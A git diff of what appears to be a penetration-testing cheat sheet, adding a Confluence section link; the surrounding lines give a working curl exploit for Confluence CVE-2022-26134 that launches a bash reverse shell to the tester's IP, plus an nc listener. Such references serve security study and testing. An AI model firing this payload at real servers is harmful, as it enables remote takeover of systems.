@@ -108,6 +108,7 @@ I try as much as possible to link to the various sources or inspiration for thes
   - [Application level Denial of Service](#application-level-denial-of-service)
   - [APIs attacks](#apis-attacks)
   - [Grafana attacks](#grafana-attacks)
+  - [Confluence attacks](#confluence-attacks)
 - [Client-Side Attacks](#client-side-attacks)
   - [Client Information Gathering](#client-information-gathering)
   - [HTML applications](#html-applications)
@@ -2878,6 +2879,8 @@ Common API path convention: `/api_name/v1`
 1. See: [Active Exploitation of Confluence CVE-2022-26134](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/)
 2. `curl http://<Confluence-IP>:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/<YOUR-IP>/<YOUR-PORT>%200%3E%261%27%29.start%28%29%22%29%7D/`
 3. Run a listener `nc -nvlp 4444`
+
+
 
 ## Client-Side Attacks
 
